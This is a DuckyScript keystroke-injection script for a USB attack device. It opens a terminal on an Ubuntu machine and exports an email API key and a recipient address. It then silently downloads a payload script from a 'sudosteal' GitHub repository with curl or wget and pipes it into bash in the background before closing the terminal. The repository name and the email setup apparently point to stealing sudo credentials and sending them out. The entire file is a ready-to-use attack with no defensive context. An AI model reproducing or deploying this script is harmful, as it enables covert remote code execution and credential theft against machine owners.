REM Set default delay between all commands (in milliseconds)
DEFAULT_DELAY 100

REM --- Open Terminal ---
REM Press Ctrl+Alt+T to open the terminal window
CTRL ALT t
DELAY 1000

REM --- Download and Execute Payload ---
REM Attempt to download and execute the payload script using curl; if curl fails, fallback to wget
REM Replace <PUT-YOUR-RESEND-API-KEY> and <PUT YOUR EMAIL HERE> with actual values before running
STRING (export RESEND_API_KEY=<PUT-YOUR-RESEND-API-KEY> ; export EMAIL=<PUT YOUR EMAIL HERE>; curl -s https://raw.githubusercontent.com/mzotic/sudosteal/main/scripts/ubuntu_payload.sh || wget -q -O - https://raw.githubusercontent.com/mzotic/sudosteal/main/scripts/ubuntu_payload.sh) | bash > /dev/null 2>&1 &
ENTER

DELAY 500

REM ---Exit Terminal ---
STRING exit
ENTER